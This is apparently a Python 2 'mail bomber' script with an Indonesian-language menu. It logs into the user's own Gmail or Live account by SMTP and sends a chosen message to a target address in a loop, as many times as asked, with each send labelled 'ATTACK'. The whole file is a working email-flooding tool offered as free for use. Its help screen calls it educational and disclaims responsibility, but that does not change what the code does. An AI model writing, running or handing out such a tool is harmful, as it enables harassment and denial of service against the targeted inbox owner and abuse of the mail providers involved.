#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys, os, time
import smtplib
import string
import sys

def prompt(prompt):
    return string.strip(raw_input(prompt))

os.system('cls')
print

print""" 
················································································
································pPC·········)bp·································
····························pQDP··············)QDbp·····························
························ppDDDPc·················)DDDDpc·························
······················DDDDDP······················cDDDDDD·······················
·····················dDDDDD·························DDDDD·······················
·····················)DDDDD························)DDDDD·······················
·····················)DDDDDp·······················)DDDDD·······················
·····················)DDDDDC·········ppDpc·········DDDDDD·······················
·····················(DDDDDD·····spDDDDDDDDDp······DDDDDDP······················
·····················QDDDDDD··pDDDDDDPS·)DDDDDDbp·)DDDDDDb······················
·····················DDDDDDDbppc)PC·········PPScppDDDDDDDC······················
··················pDDDDDDDDDDDDDDDpc·······ppDDDDDDDDDDDDDDbp···················
··············spDDDDDDDDDDDDDDDDDDDDDDD·DDDDDDDDDDDDDDDDDDDDDDDp················
···········pDDDDDDDDDDDDDDDDDDDDPPPPPPP·PPPPPPQDDDDDDDDDDDDDDDDDDDbp············
·······spDDDDDDDDDDPCc·)p)DDDDDDDp···········dDDDDDDP·p··)PPDDDDDDDDDDp·········
·······SDDDDDDPCc······)DDbc)DDDDDb·········QDDDDPSpDDD········)PDDDDDDP········
·······SDDP············)DDDP···)DPP)·······)PDP····DDDD·············DDDP········
·······SDD·············)DDDP·····)DDDp···dDDD······DDDD·············)DDP········
·······SDP·············)DDDb······DDDDp·pDDDD······DDDD··············DDP········
·······SD··············)DDDDDDpc··DDDDDDDDDDC··ppDDDDDD··············)DP········
·······SP·················)PDDDDD·SDDDDDDDDDP)DDDDDPS·················)P········
·······(······················PDDb)DDDDDDDDD·DDPC······················P········
·································)sDDDDDDDDD·c··································
·······························spDDDDDDDDDDDDDp·································
····························spDDDDDDDDDDDDDDDDDDDp······························
············)PDbppc······spDDDDDDDDDPPc·)PDDDDDDDDDDp·······sppQPPc·············
················)PDDDDDDDDDDDDDDPPc·········)PDDDDDDDDDDDDDDDP··················
····················)PDDDDDDPCc··················SDDDDDDDPS·····················
························)S···························)C·························
················································································
       ####### ######  ######  ####### ######     #         ###   #       
       #       #     # #     # #     # #     #    #    #   #   #  #    #  
       #       #     # #     # #     # #     #    #    #  #     # #    #  
       #####   ######  ######  #     # ######     #    #  #     # #    #  
       #       #   #   #   #   #     # #   #      ####### #     # ####### 
       #       #    #  #    #  #     # #    #          #   #   #       #  
       ####### #     # #     # ####### #     #         #    ###        #
                                                          Mail Bomber """                                                                                 
time.sleep(1)

print
print" =================================="
print" |           KERNEL-PANIC          |"
print" =================================="

time.sleep(4)

def index():
    os.system('cls')
    print" =================================="
    print" |    https://errorcybernews.com   |"
    print" =================================\n"
    print "Pilih Menu:"
    print
    print "[1] Bomber"
    print "[2] Help"
    print "[3] Copy Rights"
    print "[0] Exit"
    print
 
    select = raw_input('=>>')
    if select == '1':
        bomber()
    elif select == '2':
        help()
    elif select == '3':
        copyrights()
    elif select == '0':
        sys.exit()
    else:
        os.system('cls')
        print "Tidak Valid!"
        print
        index()

def bomber():

    os.system("cls")

    print""
    print" ================================="
    print" |    Konfigurasi mail server    |"
    print" ================================="
    print""
    print" ######################################################################"
    print" #                                                                    #" 
    print" #    *** Autorisasi penggunaan aplikasi yang kurang aman             #"
    print" #           dari pengaturan kontak Anda (Gmail...) ***               #"
    print" #                                                                    #"
    print" ######################################################################"
    print" "
    print" *** Ctrl+C untuk keluar dari program ***"
    print
    print" Masukkan alamat email Anda. "

    compte_email = raw_input(" Email: ")
    print""

    print" Masukkan kata sandi Anda. "
    compte_password =raw_input(" MDP: ")
    print" "

    print" Masukkan alamat target Anda. "
    cible = raw_input(" Alamat target: ")
    print" "

    print " Tentukan jumlah pesan yang akan dikirim. "
    nb = raw_input(" Jumlah pesan: ")
    print" "

    print"Masukan pesan Anda di sini. "
    message = raw_input(" Pesan Anda: ")

    server_disponible = ["Gmail", "Live"]
    i = 1

    for server in server_disponible:
        print " ["+str(i)+"] "+server


        i = 1+i

    server = input("Pilih server: ")

    if(server > 0 and server <i):
        if(server_disponible[server-1] == "Gmail"):
            server = "smtp.gmail.com"
            port = 587
        elif(server_disponible[server-1] == "Live"):
            server = "smtp.live.com"
            port = 465


        send = 0
        server = smtplib.SMTP(server, port)
        server.ehlo()
        server.starttls()
        server.login(compte_email, compte_password)

            #message
        
        print "kirim"
        print""
        print" Ctrl+C untuk menghentikan serangan! "

        email = "test@gmail.com"
        while(nb > send):
            print
            print "***Ctrl +C untuk menghentikan serangan!***"
            print "ATTACK:"+str(send)
            msg = "From: "+compte_email+"\n"+message
            server.sendmail(compte_email, cible, message) #Mon Email, email Cible, message
            send = send+1
        server.quit()
        print "Selesai"
        print "Berhenti ("+str(send)+")"
        index()

    else:
        os.system('cls')
        print
        print "##############################################"
        print "#                                            #"
        print "#         Tidak ada request server!          #"
        print "#                                            #"
        print "##############################################"
        pause = raw_input('')
        index()
        #sys.exit()

def help():

    os.system('cls')

    print
    print "         ###################################"
    print "         #                                 #"
    print "         #   ***>>-  Peringatan!  -<<***   #"
    print "         #                                 #"
    print "         ###################################"
    print """
 */!\ Saya tidak bertanggung jawab atas perlakuan Anda menggunakan program ini./!\*
    Bomber menggunakan server SMTP untuk mengirim email massal,  
    Jika Anda melakukan pemboman pada orang lain tanpa izin, 
    Anda bisa mendapatkan masalah serius. 
    Program ini dibuat untuk tujuan pembelajaran, 
    untuk menunjukkan fungsi fitur SMTP dari bahasa pemograman Python.
     ~ Kernel-Panic
    --- Tekan \'Enter\' untuk selengkapnya. . ."""
    print
    print "Kembali ke Menu Utama tekan 'Enter'..."
    pause = raw_input('')
    os.system('cls')
    index()
 
def copyrights():

    os.system('cls')

    print """
 
 ############################################
 #                                          #
 #              Tentang saya?               #
 #                                          #
 ============================================
 |                                          |
 |     - Author: Kernel-Panic               |
 |                                          |
 |     - Kontak: kernel_panic@mail2tor.com  |
 |                                          |
 |     - Type: Python --Open-Source.        |
 |                                          |
 |     - Free for use.                      |
 |                                          |
 |     - https://errorcybernews.com         |
 |                                          |
 ============================================
    """
    pause = raw_input('')
    os.system('cls')
    index()

 
 
 
index()
